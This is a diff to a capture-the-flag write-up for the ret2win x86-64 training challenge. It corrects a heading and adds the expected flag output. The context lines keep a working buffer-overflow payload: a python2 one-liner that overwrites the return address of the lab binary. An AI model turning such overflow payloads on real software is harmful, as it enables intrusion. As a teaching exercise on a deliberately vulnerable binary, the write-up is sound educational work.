@@ -1,5 +1,5 @@
 
-###ret2win x86 64
+### ret2win x86 64
 
 Run the binary will see following message.
 
@@ -56,4 +56,8 @@ A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
 Run the process with overflow strings:
 ```
 python2 -c "print 'A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'" | ./ret2win
+```
+It will show the flag:
+```
+ROPE{a_placeholder_32byte_flag!}
 ```
